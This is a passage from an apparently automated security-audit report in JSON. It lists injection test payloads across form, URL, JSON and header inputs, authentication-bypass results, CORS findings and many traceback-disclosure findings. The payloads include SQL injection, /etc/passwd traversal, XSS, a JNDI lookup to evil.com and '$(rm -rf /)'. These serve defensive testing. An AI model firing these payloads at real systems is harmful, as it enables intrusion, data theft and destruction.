            "context": "        \n        # Open memory mapped file\n        with open(self.shm_path, \"r+b\") as f:\n            self.mmap_obj = mmap.mmap(f.fileno(), 0)\n        ",
            "cvss_score": 8.5
          }
        ]
      },
      "summary": {
        "total_scans": 6,
        "critical_findings": 0,
        "overall_risk": "MEDIUM"
      }
    },
    "dynamic_testing": {
      "input_validation_tests": {
        "payloads_tested": 8,
        "vulnerabilities_found": 32,
        "test_results": [
          {
            "payload": "'; DROP TABLE users; --",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "SQL_INJECTION"
          },
          {
            "payload": "'; DROP TABLE users; --",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "SQL_INJECTION"
          },
          {
            "payload": "'; DROP TABLE users; --",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "SQL_INJECTION"
          },
          {
            "payload": "'; DROP TABLE users; --",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "SQL_INJECTION"
          },
          {
            "payload": "../../../etc/passwd",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "PATH_TRAVERSAL"
          },
          {
            "payload": "../../../etc/passwd",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "PATH_TRAVERSAL"
          },
          {
            "payload": "../../../etc/passwd",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "PATH_TRAVERSAL"
          },
          {
            "payload": "../../../etc/passwd",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "PATH_TRAVERSAL"
          },
          {
            "payload": "<script>alert('XSS')</script>",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "XSS"
          },
          {
            "payload": "<script>alert('XSS')</script>",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "XSS"
          },
          {
            "payload": "<script>alert('XSS')</script>",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "XSS"
          },
          {
            "payload": "<script>alert('XSS')</script>",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "XSS"
          },
          {
            "payload": "${jndi:ldap://evil.com/exploit}",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "${jndi:ldap://evil.com/exploit}",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "${jndi:ldap://evil.com/exploit}",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "${jndi:ldap://evil.com/exploit}",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "{{7*7}}",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "{{7*7}}",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "{{7*7}}",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "{{7*7}}",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "$(rm -rf /)",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "COMMAND_INJECTION"
          },
          {
            "payload": "$(rm -rf /)",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "COMMAND_INJECTION"
          },
          {
            "payload": "$(rm -rf /)",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "COMMAND_INJECTION"
          },
          {
            "payload": "$(rm -rf /)",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "COMMAND_INJECTION"
          },
          {
            "payload": "' OR '1'='1",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "' OR '1'='1",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "' OR '1'='1",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "' OR '1'='1",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "\\x00\\x0a\\x0d",
            "input_type": "form_data",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "\\x00\\x0a\\x0d",
            "input_type": "url_params",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "\\x00\\x0a\\x0d",
            "input_type": "json_body",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          },
          {
            "payload": "\\x00\\x0a\\x0d",
            "input_type": "headers",
            "blocked": false,
            "sanitized": false,
            "vulnerability": "POTENTIAL"
          }
        ]
      },
      "authentication_bypass_tests": {
        "bypass_tests": [
          {
            "test": "No authentication header",
            "result": "VULNERABLE"
          },
          {
            "test": "Invalid JWT token",
            "result": "VULNERABLE"
          },
          {
            "test": "Expired JWT token",
            "result": "VULNERABLE"
          },
          {
            "test": "SQL injection in login",
            "result": "NEEDS_TESTING"
          },
          {
            "test": "Default credentials",
            "result": "NEEDS_TESTING"
          },
          {
            "test": "Session fixation",
            "result": "NEEDS_TESTING"
          }
        ],
        "authentication_coverage": "2.3%",
        "total_endpoints": 1885,
        "authenticated_endpoints": 43,
        "vulnerable_endpoints": [],
        "overall_risk": "CRITICAL"
      },
      "session_management_tests": {
        "session_fixation": "NEEDS_TESTING",
        "session_hijacking": "NEEDS_TESTING",
        "secure_cookies": "NOT_IMPLEMENTED",
        "session_timeout": "NOT_CONFIGURED",
        "csrf_protection": "NEEDS_TESTING",
        "overall_score": "VULNERABLE"
      },
      "cors_security_tests": {
        "cors_issues_found": 4,
        "issues": [
          {
            "file": "security_audit_phase2.py",
            "issue": "Wildcard CORS configuration",
            "severity": "HIGH"
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "issue": "Wildcard CORS origin",
            "severity": "HIGH"
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "issue": "Wildcard CORS configuration",
            "severity": "HIGH"
          },
          {
            "file": "benchmarks/dashboard_server.py",
            "issue": "Wildcard CORS configuration",
            "severity": "HIGH"
          }
        ],
        "risk_level": "HIGH"
      },
      "rate_limiting_tests": {
        "rate_limiting_implemented": true,
        "dos_protection": "MINIMAL",
        "risk_level": "LOW"
      },
      "error_handling_tests": {
        "error_disclosure_issues": 171,
        "issues": [
          {
            "file": "test_lru_cache_basic.py",
            "line": 289,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "security_audit_circle_consultation.py",
            "line": 190,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_cors_config_basic.py",
            "line": 104,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_all_mcp_servers_parallel.py",
            "line": 1002,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 104,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 157,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 260,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 302,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 355,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 418,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 474,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_chaos_engineering_simple.py",
            "line": 544,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_integration.py",
            "line": 212,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_bash_god_comprehensive.py",
            "line": 659,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_memory_standalone.py",
            "line": 642,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_logging_system.py",
            "line": 162,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_logging_system.py",
            "line": 172,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "bash_command_coordination_system.py",
            "line": 587,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 89,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 130,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 179,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 211,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 258,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circuit_breaker_simple.py",
            "line": 324,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "setup_mcp_servers_complete.py",
            "line": 166,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_fixes.py",
            "line": 35,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_fixes.py",
            "line": 54,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_fixes.py",
            "line": 56,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_fixes.py",
            "line": 73,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_fixes.py",
            "line": 99,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_openrouter_direct.py",
            "line": 65,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_openrouter_direct.py",
            "line": 116,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "validate_script_integration.py",
            "line": 436,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_comprehensive.py",
            "line": 584,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_cors_security_fixes.py",
            "line": 584,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circle_of_experts_with_env.py",
            "line": 78,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_memory_leak_fixes.py",
            "line": 502,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 374,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "agent_5_integration_testing_framework.py",
            "line": 636,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circle_of_experts_multi.py",
            "line": 92,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "comprehensive_mcp_protocol_validation.py",
            "line": 1504,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "discover_and_integrate_mcp_servers_v2.py",
            "line": 723,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "discover_and_integrate_mcp_servers.py",
            "line": 558,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_gc_optimization_comprehensive.py",
            "line": 491,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "agent_6_comprehensive_integration_testing_framework.py",
            "line": 1360,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "deploy_mcp_production_final.py",
            "line": 731,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "chaos_engineering_validation.py",
            "line": 886,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "api_performance_benchmark.py",
            "line": 544,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "install_mcpso_servers_final.py",
            "line": 155,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_rbac_system.py",
            "line": 540,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_api_functionality.py",
            "line": 363,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 288,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "integrate_recommended_mcp_servers.py",
            "line": 109,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circle_of_experts_comprehensive.py",
            "line": 480,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "validate_cors_fixes.py",
            "line": 374,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "simple_api_demo.py",
            "line": 565,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "deploy_parallel_10_agents.py",
            "line": 981,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_core_integration.py",
            "line": 116,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "deploy_mcp_production_fixed.py",
            "line": 799,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 2252,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "validate_core_integration.py",
            "line": 248,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circle_of_experts_simple.py",
            "line": 63,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "agent_6_integration_test_runner.py",
            "line": 644,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "comprehensive_test_suite.py",
            "line": 204,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_lru_only.py",
            "line": 400,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_circle_of_experts_direct.py",
            "line": 114,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_bash_god_production.py",
            "line": 778,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_monitoring.py",
            "line": 273,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_memory_monitoring_simple.py",
            "line": 391,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "stress_cycle_validation.py",
            "line": 694,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "agent_5_lightweight_integration_test.py",
            "line": 445,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_agent8_standalone_integration.py",
            "line": 740,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_deepseek_direct.py",
            "line": 106,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_mcp_servers_simplified.py",
            "line": 372,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_advanced_mcp_integration.py",
            "line": 234,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "deploy_mcp_production.py",
            "line": 537,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "comprehensive_integration_validation.py",
            "line": 673,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_coordination_hub.py",
            "line": 455,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/mcp_testing_framework.py",
            "line": 2104,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/run_all_mcp_tests.py",
            "line": 727,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/mcp_security_testing.py",
            "line": 1252,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/mcp_protocol_compliance.py",
            "line": 878,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/mcp_health_monitoring.py",
            "line": 1150,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/mcp_stress_testing.py",
            "line": 1033,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "scripts/db_manager.py",
            "line": 365,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "scripts/demo_deployment_orchestration.py",
            "line": 87,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "scripts/demo_deployment_orchestration.py",
            "line": 561,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "scripts/deploy_mcp_servers.py",
            "line": 529,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "scripts/circle_of_experts_performance_consultation.py",
            "line": 404,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "examples/mcp_deployment_automation.py",
            "line": 425,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "examples/circle_of_experts_usage.py",
            "line": 270,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "examples/adaptive_learning_demo.py",
            "line": 536,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "examples/expert_integration_analysis.py",
            "line": 535,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "benchmarks/performance_suite.py",
            "line": 1208,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/test_ml_modules_focused.py",
            "line": 491,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/test_ml_modules_comprehensive.py",
            "line": 491,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/test_ml_algorithms_comprehensive.py",
            "line": 762,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_final_integration_tests.py",
            "line": 496,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/simple_error_test.py",
            "line": 506,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_integration_tests.py",
            "line": 112,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "line": 506,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/test_simple_integration.py",
            "line": 135,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_security_validation.py",
            "line": 490,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy_security_framework.py",
            "line": 897,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_comprehensive.py",
            "line": 295,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_comprehensive.py",
            "line": 297,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/cli/base_command.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 829,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 5659,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/tests/test_python_versions.py",
            "line": 82,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/tests/test_ffi_comprehensive.py",
            "line": 705,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/tests/test_ffi_comprehensive.py",
            "line": 1233,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/exceptions.py",
            "line": 164,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/exceptions.py",
            "line": 169,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/cli/base_command.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 829,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 5659,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/cmdline.py",
            "line": 975,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/multiproc.py",
            "line": 45,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/coverage/multiproc.py",
            "line": 46,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/pytester.py",
            "line": 1171,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cffi/backend_ctypes.py",
            "line": 878,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_exceptions.py",
            "line": 88,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvloop/_testbase.py",
            "line": 104,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/uvloop/_testbase.py",
            "line": 105,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/bs4/diagnose.py",
            "line": 80,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/bs4/diagnose.py",
            "line": 231,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/structlog/_frames.py",
            "line": 27,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/rich/traceback.py",
            "line": 156,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/aiosqlite/tests/perf.py",
            "line": 54,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/greenlet/tests/fail_cpp_exception.py",
            "line": 10,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_internal/cli/base_command.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 829,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 5659,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/application/app.py",
            "line": 313,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/application/app.py",
            "line": 459,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/test/test_fdesc.py",
            "line": 229,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/reflect.py",
            "line": 392,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/process.py",
            "line": 464,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/script.py",
            "line": 188,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/names/tap.py",
            "line": 96,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/names/tap.py",
            "line": 102,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/im/ircsupport.py",
            "line": 116,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/framework/test_orchestrator.py",
            "line": 386,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/integration/test_mcp_system_integration.py",
            "line": 499,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/integration/test_mcp_system_integration.py",
            "line": 585,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/integration/test_mcp_system_integration.py",
            "line": 868,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/integration/test_system_integration.py",
            "line": 396,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "tests/integration/test_system_integration.py",
            "line": 852,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/core.py",
            "line": 837,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/core.py",
            "line": 5839,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/exceptions.py",
            "line": 164,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/exceptions.py",
            "line": 169,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/cbook.py",
            "line": 112,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/cbook.py",
            "line": 244,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/ttFont.py",
            "line": 493,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/ttProgram.py",
            "line": 259,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/externals/loky/backend/queues.py",
            "line": 193,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/cli/base_command.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 829,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
